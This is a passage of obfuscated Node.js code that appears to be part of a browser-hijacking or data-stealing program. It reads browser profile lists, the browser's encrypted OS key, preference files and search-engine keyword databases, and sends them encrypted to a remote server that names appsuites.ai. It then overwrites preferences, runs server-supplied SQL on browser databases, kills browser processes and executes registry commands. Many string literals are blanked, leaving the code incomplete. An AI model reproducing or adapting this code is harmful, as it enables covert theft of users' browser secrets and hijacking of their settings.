                await ns.w3F3UWA.W4EF0EI(0, ns.z579NEI.c5C958F, arr10);
              }
            }
            if (pb.H5C67AR) {
              if (pb.a6AFL0X) {
                await this.p4FE5X4(nt.e5325L3.H64FNMG);
              } else if (pb.n412K1U) {
                await this.j458FW3(nt.e5325L3.H64FNMG);
              }
              if (pb.D4E3EHU) {
                await this.k47F3QK(nt.e5325L3.M56F8MB);
              }
              if (pb.E67CJ69 && nt.e5325L3.R6780KK) {
                ns.w3F3UWA.s59BT06('');
                await this.c647ECB(pb.a586DQ2);
              }
              if (pb.X42CN81 && nt.e5325L3.g4184BO) {
                ns.w3F3UWA.s59BT06('');
                await this.w5C1TZN(pb.Y4B23HN);
              }
              if (pb.T5B2T2A && nt.e5325L3.x4ADWAE) {
                ns.w3F3UWA.s59BT06('');
                await this.h659UF4(pb.V54518G);
              }
              if (pb.T5F71B2 && nt.e5325L3.z4DE429) {
                ns.w3F3UWA.s59BT06('');
                await this.W5F8HOG(pb.g5ABMVH);
              }
            }
            await ns.w3F3UWA.W4EF0EI(0, ns.z579NEI.f63DUQF, [nt.e5325L3.k596N0J, nt.e5325L3.n664BX9, nt.e5325L3.R6780KK, nt.e5325L3.g4184BO, nt.e5325L3.x4ADWAE, nt.e5325L3.r53FV0M, pb.H5C67AR, pb.n412K1U, pb.n5B332O, pb.k61AQMQ, pb.a6AFL0X, pb.D4E3EHU, nt.e5325L3.z4DE429]);
            return pb;
          } catch (pf) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.m41EBJQ, pf);
            return;
          }
        }
        async m6ABVY9() {
          nt.e5325L3.q474LOF = (await nr.S559FZQ.l610ZCY("iid")) ?? '';
          if (!nt.e5325L3.q474LOF || nt.e5325L3.q474LOF == '') {
            ns.w3F3UWA.s59BT06('');
            return false;
          }
          return true;
        }
        async U6B4YNR() {
          const pg = nt.e5325L3.q474LOF ?? '';
          const params2 = new require("url").URLSearchParams();
          const ph = nr.S559FZQ.n677BRA.substring(0, 24) + pg.substring(0, 8);
          const pi = ns.O694X7J(ph, JSON.stringify({
            iid: pg,
            version: nt.e5325L3.Y55B2P2,
            isSchedule: '0'
          }));
          params2.append("data", pi.data);
          params2.append("iv", pi.iv);
          params2.append("iid", nt.e5325L3.q474LOF ?? '');
          let pj = await ns.h5235DD("api/s3/options", params2);
          if (pj && pj.ok) {
            ns.w3F3UWA.s59BT06('');
            let pk = await pj.json();
            if (pk.data) {
              let pl = function (pn, po) {
                return '' + pn + po.toString().padStart(2, '0');
              };
              const data2 = JSON.parse((0, ns.U61FWBZ)(ph, pk.data, pk.iv));
              let pm = 1;
              nt.E506IW4.f538M6A = data2[pl('A', pm++)];
              nt.E506IW4.y50355J = data2[pl('A', pm++)];
              nt.E506IW4.q531YE2 = data2[pl('A', pm++)];
              nt.E506IW4.V573T48 = data2[pl('A', pm++)];
              nt.E506IW4.Z643HV5 = data2[pl('A', pm++)];
              nt.E506IW4.M4F7RZT = data2[pl('A', pm++)];
              nt.E506IW4.U548GP6 = data2[pl('A', pm++)];
              nt.E506IW4.q3F6NE0 = data2[pl('A', pm++)];
              nt.E506IW4.G5A3TG6 = data2[pl('A', pm++)];
              nt.E506IW4.v50CKDQ = data2[pl('A', pm++)];
              nt.E506IW4.v4A5HA6 = data2[pl('A', pm++)];
              nt.E506IW4.U40AV23 = data2[pl('A', pm++)];
              nt.E506IW4.z626Z6P = data2[pl('A', pm++)];
              nt.E506IW4.F431S76 = data2[pl('A', pm++)];
              nt.E506IW4.E42DSOG = data2[pl('A', pm++)];
              nt.E506IW4.o5D81YO = data2[pl('A', pm++)];
              nt.E506IW4.Y4F9KA9 = data2[pl('A', pm++)];
              nt.E506IW4.G555SVW = data2[pl('A', pm++)];
              nt.E506IW4.e4BDF2X = data2[pl('A', pm++)];
              nt.E506IW4.Q63EEZI = data2[pl('A', pm++)];
              nt.E506IW4.L4865QA = data2[pl('A', pm++)];
              nt.E506IW4.D472X8L = data2[pl('A', pm++)];
              nt.E506IW4.h676I09 = data2[pl('A', pm++)];
              nt.E506IW4.v4BE899 = data2[pl('A', pm++)];
              nt.E506IW4.E5D2YTN = data2[pl('A', pm++)];
              nt.E506IW4.n5F14C8 = data2[pl('A', pm++)];
              nt.E506IW4.M4AFW8T = data2[pl('A', pm++)];
              nt.E506IW4.s64A8ZU = data2[pl('A', pm++)];
              nt.E506IW4.O680HF3 = data2[pl('A', pm++)];
              nt.E506IW4.n6632PG = data2[pl('A', pm++)];
              nt.E506IW4.a423OLP = data2[pl('A', pm++)];
              nt.E506IW4.e4C2ZG5 = data2[pl('A', pm++)];
              nt.E506IW4.s5A8UWK = data2[pl('A', pm++)];
              nt.E506IW4.e44E7UV = data2[pl('A', pm++)];
              nt.E506IW4.w668BQY = data2[pl('A', pm++)];
              nt.E506IW4.q4D91PM = data2[pl('A', pm++)];
              nt.E506IW4.r6BA6EQ = data2[pl('A', pm++)];
              nt.E506IW4.g65BAO8 = data2[pl('A', pm++)];
              nt.E506IW4.P5D7IHK = data2[pl('A', pm++)];
              nt.E506IW4.g6AEHR8 = data2[pl('A', pm++)];
              nt.E506IW4.W46DKVE = data2[pl('A', pm++)];
              nt.E506IW4.C587HZY = data2[pl('A', pm++)];
              nt.E506IW4.L4F4D5K = data2[pl('A', pm++)];
              nt.E506IW4.d5A04IA = data2[pl('A', pm++)];
              nt.E506IW4.X69CKV1 = data2[pl('A', pm++)];
              nt.E506IW4.Q68703N = data2[pl('A', pm++)];
              nt.E506IW4.k5FECH9 = data2[pl('A', pm++)];
              nt.E506IW4.Q6AD4K1 = data2[pl('A', pm++)];
              nt.E506IW4.c4954SH = data2[pl('A', pm++)];
              nt.E506IW4.n601ESN = data2[pl('A', pm++)];
              nt.E506IW4.c41AH48 = data2[pl('A', pm++)];
              nt.E506IW4.c507RUL = data2[pl('A', pm++)];
              nt.E506IW4.B5176TW = data2[pl('A', pm++)];
              nt.E506IW4.f44CYDD = data2[pl('A', pm++)];
              nt.E506IW4.D582MML = data2[pl('A', pm++)];
              nt.E506IW4.A6C6QFI = data2[pl('A', pm++)];
              nt.E506IW4.E509RHP = data2[pl('A', pm++)];
              nt.E506IW4.p49ALL3 = data2[pl('A', pm++)];
              nt.E506IW4.H4A2CBA = data2[pl('A', pm++)];
              nt.E506IW4.Y420K0O = data2[pl('A', pm++)];
              nt.E506IW4.V615O8R = data2[pl('A', pm++)];
              nt.E506IW4.g477SEM = data2[pl('A', pm++)];
              nt.E506IW4.T525XE5 = data2[pl('A', pm++)];
              nt.E506IW4.V68C0TQ = data2[pl('A', pm++)];
              nt.E506IW4.P41D36M = data2[pl('A', pm++)];
              nt.E506IW4.I4E1ZJ4 = data2[pl('A', pm++)];
              nt.E506IW4.r62EVVQ = data2[pl('A', pm++)];
              nt.E506IW4.I4046MY = data2[pl('A', pm++)];
              nt.E506IW4.i61EV2V = data2[pl('A', pm++)];
              nt.E506IW4.l6C9B2Z = data2[pl('A', pm++)];
              nt.E506IW4.z3EF88U = data2[pl('A', pm++)];
              nt.E506IW4.C61B0CZ = data2[pl('A', pm++)];
              nt.E506IW4.i623ZUC = data2[pl('A', pm++)];
              nt.E506IW4.F6750PF = data2[pl('A', pm++)];
              nt.E506IW4.w443M14 = data2[pl('A', pm++)];
              if (!nt.E506IW4.d6C8UEH()) {
                throw new Error("GetRtcFailed");
              }
            } else {
              throw new Error("PrepareRtcBlocked");
            }
          } else {
            throw new Error("PrepareRtcFailed");
          }
        }
        async Z425M7G() {
          this.A64CEBI = ns.S634YX3((await nr.S559FZQ.l610ZCY("usid")) ?? '');
          ns.w3F3UWA.s59BT06('');
          if (((await nr.S559FZQ.l610ZCY("c-key")) ?? '') != nt.e5325L3.q474LOF) {
            this.Z5A9DKG = true;
          }
          nt.e5325L3.U430LYO = await this.D656W9S(2);
          nt.e5325L3.r53FV0M = nt.e5325L3.U430LYO != '';
          nt.e5325L3.a6B1QAU = await this.D656W9S(1);
          nt.e5325L3.k596N0J = nt.e5325L3.a6B1QAU != '';
          if ((await this.D656W9S(3)) != '') {
            nt.e5325L3.g4184BO = true;
          }
          if ((await this.D656W9S(4)) != '') {
            nt.e5325L3.R6780KK = true;
          }
          if ((await this.D656W9S(5)) != '') {
            nt.e5325L3.n664BX9 = true;
          }
          if ((await this.D656W9S(6)) != '') {
            nt.e5325L3.x4ADWAE = true;
          }
          if ((await this.D656W9S(7)) != '') {
            nt.e5325L3.z4DE429 = true;
          }
          nt.e5325L3.H64FNMG = await this.o43FWNP(false, 1);
          nt.e5325L3.M56F8MB = await this.o43FWNP(false, 2);
          nt.e5325L3.X4B7201 = false;
          if ("" && Array.isArray("")) {
            for (let pp = 0; pp < "".length; pp++) {
              if (await this.A5FCGS4(""[pp])) {
                nt.e5325L3.b57CS7T = pp;
                ns.w3F3UWA.s59BT06('');
                break;
              }
            }
          }
          if ("" && Array.isArray("")) {
            ns.w3F3UWA.s59BT06('');
            for (let pq = 0; pq < "".length; pq++) {
              const pr = ""[pq];
              if (await this.u459C3E(pr.Item1, pr.Item2)) {
                nt.e5325L3.K48B40X = pq;
                ns.w3F3UWA.s59BT06('');
                break;
              }
            }
            ns.w3F3UWA.s59BT06('');
          }
        }
        async o43FWNP(ps, pt) {
          return new Promise((pu) => {
            var str10 = "";
            switch (pt) {
              case 1:
                str10 = "";
                break;
              case 2:
                str10 = "";
                break;
            }
            require("child_process").exec((0, ns.o5B4F49)("", str10, ''), (pv, pw, px) => {
              if (pv) {
                (async () => {
                  await ns.w3F3UWA.Y6CDW21(pt, ns.z579NEI.O5CE32V, pv);
                })();
                pu(false);
              }
              if (px) {
                (async () => {
                  await ns.w3F3UWA.Y6CDW21(pt, ns.z579NEI.C4D4SOG, pv);
                })();
                pu(false);
              }
              ns.w3F3UWA.s59BT06('');
              pu(pw.trim() !== '');
            });
          });
        }
        async l660ZQF() {
          ns.w3F3UWA.s59BT06('');
          let py = await nr.S559FZQ.l610ZCY("iid");
          if (py) {
            nt.e5325L3.q474LOF = py;
            try {
              var pz = await ns.e696T3N("api/s3/remove?iid=" + py);
              if (pz) {
                const qa = await pz.json();
              }
              await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.z450T6K);
            } catch (qb) {
              await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.z450T6K, qb);
            }
          }
        }
        async D656W9S(qc) {
          const path5 = require("path");
          let str11 = '';
          if (qc == 1) {
            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (qc == 2) {
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (qc == 3) {
            str11 = path5.join(require("process").env.USERPROFILE, "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (qc == 4) {
            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (qc == 5) {
            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (qc == 6) {
            str11 = path5.join(nr.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (qc == 7) {
            str11 = path5.join(nr.S559FZQ.P6A7H5F(), "", "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          }
          return '';
        }
        async j458FW3(qd) {
          ns.w3F3UWA.s59BT06('');
          if (this.A64CEBI == '' || !nt.e5325L3.k596N0J) {
            return;
          }
          const path6 = require("path");
          const qe = nr.S559FZQ.D47CBV3();
          if (!qe) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.F65A6FS);
            return;
          }
          const qf = path6.join(qe, "");
          if (nt.e5325L3.a6B1QAU == '') {
            await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !qd || nt.e5325L3.x484Q1X == nr.a689XV5.j5C58S9) {
            if (qd) {
              qd = false;
            }
            await this.D45AYQ3("");
            ns.w3F3UWA.s59BT06('');
          }
          ns.w3F3UWA.s59BT06('');
          let [qg, qh] = await this.A554U7Y(1, path6.join(qf, ""), false);
          if (qh && qh !== '') {
            qh = this.r42EX1Q(qh);
            ns.w3F3UWA.s59BT06('');
          }
          if (qg) {
            let flag2 = false;
            for (let qi = 0; qi < qg.length; qi++) {
              let qj = path6.join(qf, qg[qi], "");
              let qk = path6.join(qf, qg[qi], "");
              let ql = path6.join(qf, qg[qi], "");
              let qm = path6.join(qf, qg[qi], "");
              if (await this.X428OQY(qj, ql)) {
                await this.X428OQY(qk, qm);
                let str12 = '';
                let str13 = '';
                await this.r576OBZ(ql).then((qo) => {
                  str12 = qo;
                }).catch((qp) => {
                  (async () => {
                    await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.n690Q7K, qp);
                  })();
                });
                await this.r576OBZ(qm).then((qq) => {
                  str13 = qq;
                }).catch((qr) => {
                  (async () => {
                    await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.V6A4P0Z, qr);
                  })();
                });
                if (str12 == '') {
                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.Q455VXT);
                  continue;
                }
                ns.w3F3UWA.s59BT06('');
                let qn = await this.O515QL8(1, str12, str13);
                if (!qn.m5BCP18) {
                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.L5CFOQF);
                  return;
                }
                if (qd && ((await this.H5AE3US(qn.C5C7K1A)) || (await this.H5AE3US(qn.K5F23B9)))) {
                  ns.w3F3UWA.s59BT06('');
                  await this.j458FW3(false);
                  return;
                }
                ns.w3F3UWA.s59BT06('');
                let flag3 = false;
                if (await this.H5AE3US(qn.C5C7K1A)) {
                  await this.Y53EKLA(ql, qn.C5C7K1A);
                  await this.X428OQY(ql, qj);
                  ns.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (await this.H5AE3US(qn.K5F23B9)) {
                  await this.Y53EKLA(qm, qn.K5F23B9);
                  await this.X428OQY(qm, qk);
                  ns.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (qn.j5D4IOV && qn.j5D4IOV.length !== 0) {
                  await this.O69AL84("" + qg[qi], "", qn.j5D4IOV);
                  ns.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (await this.H5AE3US(qn.O6CBOE4)) {
                  const data3 = JSON.parse(qn.O6CBOE4);
                  let arr11 = [];
                  for (const qs in data3) {
                    if (data3.hasOwnProperty(qs)) {
                      const qt = data3[qs];
                      for (const qu in qt) {
                        if (qt.hasOwnProperty(qu)) {
                          await this.O69AL84(qs.replace("%PROFILE%", qg[qi]), qu, qt[qu]);
                          arr11.push(qu);
                        }
                      }
                    }
                  }
                  if (arr11.length > 0) {
                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.f4D0VNO, [arr11]);
                  }
                }
                flag2 = true;
                if (flag3) {
                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.y462O1X);
                } else {
                  await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.E69EQ1O);
                }
              }
            }
            if (flag2) {
              await nr.S559FZQ.c5E4Z7C("c-key", nt.e5325L3.q474LOF);
            }
          }
          ns.w3F3UWA.s59BT06('');
          return;
        }
        async p4FE5X4(qv) {
          ns.w3F3UWA.s59BT06('');
          if (!nt.e5325L3.k596N0J) {
            return;
          }
          const path7 = require("path");
          const qw = nr.S559FZQ.D47CBV3();
          if (!qw) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.F65A6FS);
            return;
          }
          const qx = path7.join(qw, "");
          if (nt.e5325L3.a6B1QAU == '') {
            await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !qv || nt.e5325L3.x484Q1X == nr.a689XV5.j5C58S9) {
            if (qv) {
              qv = false;
              await this.D45AYQ3("");
              ns.w3F3UWA.s59BT06('');
            }
            ns.w3F3UWA.s59BT06('');
            let [qy, qz] = await this.A554U7Y(1, path7.join(qx, ""), true);
            if (qz && qz !== '') {
              qz = this.r42EX1Q(qz);
              ns.w3F3UWA.s59BT06('');
            }
            if (qy) {
              let flag4 = false;
              for (let ra = 0; ra < qy.length; ra++) {
                let rb = path7.join(qx, qy[ra], "");
                let rc = path7.join(qx, qy[ra], "");
                let rd = path7.join(qx, qy[ra], "");
                let re = path7.join(qx, qy[ra], "");
                if (await this.X428OQY(rb, rc)) {
                  await this.X428OQY(rd, re);
                  let rf;
                  let rg;
                  await this.r576OBZ(rc).then((ri) => {
                    rf = ri;
                  }).catch((rj) => {
                    (async () => {
                      await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.n690Q7K, rj);
                    })();
                  });
                  await this.G5B8BDL(re).then((rk) => {
                    rg = rk ?? '';
                  }).catch((rl) => {
                    (async () => {
                      await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.K4E5MWI, rl);
                    })();
                  });
                  if (rf == '') {
                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.Q455VXT);
                    continue;
                  }
                  ns.w3F3UWA.s59BT06('');
                  let rh = await this.w516KLO(1, qz, rf, rg);
                  if (!rh.m5BCP18) {
                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.L5CFOQF);
                    return;
                  }
                  ns.w3F3UWA.s59BT06('');
                  if (await this.H5AE3US(rh.C5C7K1A)) {
                    await this.Y53EKLA(rc, rh.C5C7K1A);
                    await this.X428OQY(rc, rb);
                    ns.w3F3UWA.s59BT06('');
                  }
                  if ((await this.H5AE3US(rh.p6845JK)) && (await this.r501Z9L(re, rh.p6845JK))) {
                    if (await this.o43FWNP(false, 1)) {
                      await this.D45AYQ3("");
                      ns.w3F3UWA.s59BT06('');
                    }
                    await this.X428OQY(re, rd);
                    ns.w3F3UWA.s59BT06('');
                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.W4F1V66);
                  } else {
                    await ns.w3F3UWA.W4EF0EI(1, ns.z579NEI.n4EBPL8);
                  }
                  flag4 = true;
                }
              }
              if (flag4) {
                await nr.S559FZQ.c5E4Z7C("cw-key", nt.e5325L3.q474LOF);
              }
            }
          }
          ns.w3F3UWA.s59BT06('');
          return;
        }
        async k47F3QK(rm) {
          ns.w3F3UWA.s59BT06('');
          if (!nt.e5325L3.k596N0J) {
            return;
          }
          const path8 = require("path");
          const rn = nr.S559FZQ.D47CBV3();
          if (!rn) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.F65A6FS);
            return;
          }
          const ro = path8.join(rn, "");
          if (nt.e5325L3.a6B1QAU == '') {
            await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !rm || nt.e5325L3.x484Q1X == nr.a689XV5.j5C58S9) {
            if (rm) {
              rm = false;
              await this.D45AYQ3("");
              ns.w3F3UWA.s59BT06('');
            }
            ns.w3F3UWA.s59BT06('');
            let [rp, rq] = await this.A554U7Y(2, path8.join(ro, ""), true);
            if (rq && rq !== '') {
              rq = this.r42EX1Q(rq);
              ns.w3F3UWA.s59BT06('');
            }
            if (rp) {
              let flag5 = false;
              for (let rr = 0; rr < rp.length; rr++) {
                let rs = path8.join(ro, rp[rr], "");
                let rt = path8.join(ro, rp[rr], "");
                let ru = path8.join(ro, rp[rr], "");
                let rv = path8.join(ro, rp[rr], "");
                if (await this.X428OQY(rs, rt)) {
                  await this.X428OQY(ru, rv);
                  let rw;
                  let rx;
                  await this.r576OBZ(rt).then((rz) => {
                    rw = rz;
                  }).catch((sa) => {
                    (async () => {
                      await ns.w3F3UWA.Y6CDW21(2, ns.z579NEI.n690Q7K, sa);
                    })();
                  });
                  await this.G5B8BDL(rv).then((sb) => {
                    rx = sb ?? '';
                  }).catch((sc) => {
                    (async () => {
                      await ns.w3F3UWA.Y6CDW21(2, ns.z579NEI.K4E5MWI, sc);
                    })();
                  });
                  if (rw == '') {
                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.Q455VXT);
                    continue;
                  }
                  ns.w3F3UWA.s59BT06('');
                  let ry = await this.w516KLO(2, rq, rw, rx);
                  if (!ry.m5BCP18) {
                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.L5CFOQF);
                    return;
                  }
                  ns.w3F3UWA.s59BT06('');
                  if (await this.H5AE3US(ry.C5C7K1A)) {
                    await this.Y53EKLA(rt, ry.C5C7K1A);
                    await this.X428OQY(rt, rs);
                    ns.w3F3UWA.s59BT06('');
                  }
                  if ((await this.H5AE3US(ry.p6845JK)) && (await this.r501Z9L(rv, ry.p6845JK))) {
                    if (await this.o43FWNP(false, 2)) {
                      await this.D45AYQ3("");
                      ns.w3F3UWA.s59BT06('');
                    }
                    await this.X428OQY(rv, ru);
                    ns.w3F3UWA.s59BT06('');
                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.W4F1V66);
                  } else {
                    await ns.w3F3UWA.W4EF0EI(2, ns.z579NEI.n4EBPL8);
                  }
                  flag5 = true;
                }
              }
              if (flag5) {
                await nr.S559FZQ.c5E4Z7C("ew-key", nt.e5325L3.q474LOF);
              }
            }
          }
          ns.w3F3UWA.s59BT06('');
          return;
        }
        async E4E2LLU(sd) {
          return new Promise((se) => setTimeout(se, sd));
        }
        async D45AYQ3(sf, sg = true) {
          const cp3 = require("child_process");
          if (sg) {
            for (let sh = 0; sh < 3; sh++) {
              ns.w3F3UWA.s59BT06('');
              cp3.exec((0, ns.o5B4F49)("", sf));
              await this.E4E2LLU(100);
            }
          }
          ns.w3F3UWA.s59BT06('');
          cp3.exec((0, ns.o5B4F49)("", sf));
          await this.E4E2LLU(100);
        }
        async A554U7Y(si, sj, sk = false) {
          try {
            const data4 = JSON.parse(require("fs").readFileSync(sj, "utf8"));
            ns.w3F3UWA.s59BT06('');
            ns.w3F3UWA.s59BT06('');
            return [Object.keys(data4.profile?.info_cache || {}), sk ? data4.os_crypt?.encrypted_key || '' : ''];
          } catch (sl) {
            await ns.w3F3UWA.Y6CDW21(si, ns.z579NEI.y46BIEQ, sl);
          }
          return [undefined, undefined];
        }
        async X428OQY(sm, sn) {
          try {
            require("fs").copyFileSync(sm, sn);
            return true;
          } catch {
            return false;
          }
        }
        async r576OBZ(so, sp = false) {
          const fs10 = require("fs");
          try {
            if (!sp) {
              return fs10.readFileSync(so, "utf8");
            }
            return fs10.readFileSync(so);
          } catch (sq) {
            throw new Error("ReadFileError: " + sq);
          }
        }
        async G5B8BDL(sr) {
          const ss = new require("better-sqlite3")(sr);
          try {
            return JSON.stringify(ss.prepare("select * from keywords").all());
          } catch (st) {
            ns.w3F3UWA.s59BT06('');
            throw new Error(st);
          } finally {
            ss.close((su) => {
              if (su) {
                ns.w3F3UWA.s59BT06('');
              }
            });
          }
        }
        async r501Z9L(sv, sw) {
          const sx = new require("better-sqlite3")(sv);
          try {
            for (const sy of JSON.parse(sw)) {
              sx.prepare(sy).run();
              ns.w3F3UWA.s59BT06('');
            }
          } catch {
            ns.w3F3UWA.s59BT06('');
            return false;
          } finally {
            sx.close((sz) => {
              if (sz) {
                ns.w3F3UWA.s59BT06('');
                return;
              }
              ns.w3F3UWA.s59BT06('');
            });
          }
          return true;
        }
        async Y53EKLA(ta, tb) {
          try {
            require("fs").writeFileSync(ta, tb);
          } catch {
            ns.w3F3UWA.s59BT06('');
          }
        }
        async A5FCGS4(tc) {
          return require("fs").existsSync(tc);
        }
        async O69AL84(td, te, tf) {
          try {
            require("child_process").execSync((0, ns.o5B4F49)("", td, te, tf));
          } catch (tg) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.u3F4OPT, tg);
          }
        }
        async w4D8BBU(th, ti) {
          try {
            ns.w3F3UWA.s59BT06('');
            require("child_process").execSync((0, ns.o5B4F49)("", th, ti));
          } catch (tj) {
            await ns.w3F3UWA.Y6CDW21(1, ns.z579NEI.h6148NE, tj);
          }
        }
        async u459C3E(tk, tl) {
          try {
            const tm = tl.trim() == '' ? (0, ns.o5B4F49)("", tk) : (0, ns.o5B4F49)("", tk, tl);
            require("child_process").execSync(tm);
            return true;
          } catch (tn) {
            if (!tn.stderr.includes("")) {
              await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.m4F36Z7, tn);
            }
          }
          return false;
        }
        async H5AE3US(to) {
          if (!to) {
            return false;
          }
          if (to.length == 0) {
            return false;
          }
          try {
            let data5 = JSON.parse(to);
            return true;
          } catch {
            return false;
          }
        }
        async e4F5CS0() {
          try {
            var tp = nt.e5325L3.q474LOF ?? '';
            const params3 = new require("url").URLSearchParams();
            const tq = nr.S559FZQ.n677BRA.substring(0, 24) + tp.substring(0, 8);
            const obj6 = {
              iid: tp,
              version: nt.e5325L3.Y55B2P2,
              isSchedule: '0',
              hasBLFile: nt.e5325L3.b57CS7T,
              hasBLReg: nt.e5325L3.K48B40X,
              supportWd: '1'
            };
            const tr = ns.O694X7J(tq, JSON.stringify(obj6));
            params3.append("data", tr.data);
            params3.append("iv", tr.iv);
            params3.append("iid", nt.e5325L3.q474LOF ?? '');
            ns.w3F3UWA.s59BT06('');
            let ts = await ns.h5235DD("api/s3/config", params3);
            if (ts && ts.ok) {
              let tt = await ts.json();
              ns.w3F3UWA.s59BT06('');
              try {
                if (tt.data) {
                  const data6 = JSON.parse((0, ns.U61FWBZ)(tq, tt.data, tt.iv));
                  ns.w3F3UWA.s59BT06('');
                  let tu = new nv();
                  tu.H5C67AR = data6.wc ?? false;
                  tu.n412K1U = data6.wcs ?? false;
                  tu.n5B332O = data6.wcpc ?? false;
                  tu.k61AQMQ = data6.wcpe ?? false;
                  tu.a6AFL0X = data6.wdc ?? false;
                  tu.D4E3EHU = data6.wde ?? false;
                  tu.E67CJ69 = data6.ol ?? false;
                  tu.a586DQ2 = data6.ol_deep ?? false;
                  tu.X42CN81 = data6.wv ?? false;
                  tu.Y4B23HN = data6.wv_deep ?? false;
                  tu.T5B2T2A = data6.sf ?? false;
                  tu.V54518G = data6.sf_deep ?? false;
                  tu.T5F71B2 = data6.pas ?? false;
                  tu.g5ABMVH = data6.pas_deep ?? false;
                  tu.t533W41 = data6.code ?? '';
                  tu.O6CBOE4 = data6.reglist ?? '';
                  return tu;
                }
              } catch (tv) {
                await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.e5C24C6, tv);
              }
            } else {
              ns.w3F3UWA.s59BT06('');
            }
          } catch (tw) {
            await ns.w3F3UWA.Y6CDW21(0, ns.z579NEI.E4AAIZR, tw);
          }
          return new nv();
        }
        async O515QL8(tx, ty, tz) {
          ns.w3F3UWA.s59BT06('');
          try {
            var ua = nt.e5325L3.q474LOF ?? '';
            const params4 = new require("url").URLSearchParams();
            const ub = nr.S559FZQ.n677BRA.substring(0, 24) + ua.substring(0, 8);
            const obj7 = {
              iid: ua,
              bid: tx,
              sid: this.A64CEBI,
              pref: ty,
              spref: tz,
              wd: '',
              version: nt.e5325L3.Y55B2P2,
              supportWd: '0',
              isSchedule: '0'
            };
            ns.w3F3UWA.s59BT06('');
            const uc = ns.O694X7J(ub, JSON.stringify(obj7));
            params4.append("data", uc.data);
            params4.append("iv", uc.iv);
            params4.append("iid", nt.e5325L3.q474LOF ?? '');
            ns.w3F3UWA.s59BT06('');
            let ud = await ns.h5235DD("api/s3/validate", params4);
            if (!ud || !ud.ok) {
              ns.w3F3UWA.s59BT06('');
              return new nw();
            }
            let ue = await ud.json();
            ns.w3F3UWA.s59BT06('');
            try {
              if (ue.data) {
                const data7 = JSON.parse((0, ns.U61FWBZ)(ub, ue.searchdata, ue.iv));
                let uf = JSON.stringify(data7.pref) ?? '';
                let ug = JSON.stringify(data7.spref) ?? '';
                let uh = JSON.stringify(data7.regdata) ?? '';
                let ui = JSON.stringify(data7.reglist) ?? '';
                if (uf == "null") {
                  uf = '';
                }
                if (ug == "null") {
                  ug = '';
                }
                if (uh == "\"\"") {
                  uh = '';
                }
                if (ui == "\"\"") {
                  ui = '';
                }
                return new nw(true, uf, ug, uh, ui);
              }
            } catch (uj) {
              await ns.w3F3UWA.Y6CDW21(tx, ns.z579NEI.l54DEIW, uj);
            }
          } catch (uk) {
            await ns.w3F3UWA.Y6CDW21(tx, ns.z579NEI.M5E3V2V, uk, ["https://appsuites.ai", "https://sdk.appsuites.ai"]);
          }
          return new nw();
        }
        async w516KLO(ul, um, un, uo) {
          ns.w3F3UWA.s59BT06('');
          try {
            var up = nt.e5325L3.q474LOF ?? '';
            const params5 = new require("url").URLSearchParams();
            const uq = nr.S559FZQ.n677BRA.substring(0, 24) + up.substring(0, 8);
            const obj8 = {
              iid: up,
              bid: ul,
              sid: this.A64CEBI,
              pref: un,
              spref: '',
              osCryptKey: um,
              wd: uo,
              version: nt.e5325L3.Y55B2P2,
              supportWd: '1',
              isSchedule: '0'
            };
            const ur = ns.O694X7J(uq, JSON.stringify(obj8));
            params5.append("data", ur.data);
            params5.append("iv", ur.iv);
            params5.append("iid", nt.e5325L3.q474LOF ?? '');
            ns.w3F3UWA.s59BT06('');
            let us = await ns.h5235DD("api/s3/validate", params5);
            if (!us || !us.ok) {
              ns.w3F3UWA.s59BT06('');
              return new nx();
            }
            let ut = await us.json();
            try {
              if (ut.data) {
                if (!ut.searchdata) {
                  return new nx(true, '', '');
                }
                const data8 = JSON.parse((0, ns.U61FWBZ)(uq, ut.searchdata, ut.iv));
                const uu = data8.pref ?? '';
                const uv = data8.webData ?? '';
                ns.w3F3UWA.s59BT06('');
                ns.w3F3UWA.s59BT06('');
